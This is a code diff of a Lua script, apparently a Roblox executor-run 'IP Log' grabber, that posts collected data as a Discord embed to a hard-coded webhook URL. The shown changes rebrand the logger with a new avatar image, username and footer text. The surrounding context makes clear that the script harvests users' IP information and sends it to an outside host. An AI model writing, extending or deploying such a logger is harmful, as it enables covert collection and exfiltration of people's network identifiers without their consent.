@@ -9,8 +9,11 @@ local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-ny
 local gameName = "Unknown"
 local embedColor = tonumber("0x00FF00" )
 
+--// 新增: 指定應用圖片 (三眼怪)
+local appIconURL = "https://i.ibb.co/fYSwfPm2/image.jpg" -- 一個高品質的三眼怪圖示
+
 --// 增強的 HTTP 請求函數
-local function secureRequest(options)
+local function secureRequest(options )
     local requestFunc = request or http_request or (syn and syn.request )
     if requestFunc then
         local success, response = pcall(function() return requestFunc(options) end)
@@ -95,13 +98,14 @@ pcall(function()
 
     -- 6. 構建並發送最終的 webhook 資料
     local data = {
-        username = "三眼怪 Log",
+        username = "三眼怪 Log V2",
+        avatar_url = appIconURL, -- 設定 Webhook 的頭像為三眼怪
         embeds = {{
             title = "IP Log:",
             description = description,
             color = embedColor,
             footer = {
-                text = "Nash Logger"
+                text = "三眼怪 ON TOP"
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
